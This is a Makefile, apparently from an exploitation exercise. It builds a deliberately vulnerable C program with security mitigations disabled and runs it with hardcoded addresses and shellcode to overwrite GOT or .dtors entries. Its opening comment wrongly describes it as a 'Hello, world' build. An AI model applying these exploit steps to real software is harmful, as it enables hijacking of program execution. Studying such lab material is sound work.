# Makefile exaple for building "Hello, world" C program

CC = gcc
ASM = nasm

CFLAGS = \
-Wall \
-Wextra \
-O0 \
-g \
-fno-omit-frame-pointer \
-fno-stack-protector \
-z execstack \
-z norelro

SRC = arbwrite.c
BIN = arbwrite

.PHONY:all clean

all:$(BIN) shellcode

$(BIN):$(SRC)
	$(CC) $(CFLAGS) -o $@ $^

shellcode: shellcode.asm
	nasm -o $@ $<

runex:
	./$(BIN) `perl -e 'printf "\xef\xbe\xad\xde"'` AAAA BBBB

runsh_got:
	./$(BIN) \
	`perl -e 'printf "\xac\x97\x04\x08"'` \
	`perl -e 'printf "\xf3\xf7\xff\xbf"'` \
	"`cat shellcode`"

runsh_dtors:
	./$(BIN) \
	`perl -e 'printf "\xa8\x96\x04\x08"'` \
	`perl -e 'printf "\xf3\xf7\xff\xbf"'` \
	"`cat shellcode`"

clean:
	rm $(BIN)
	rm shellcode

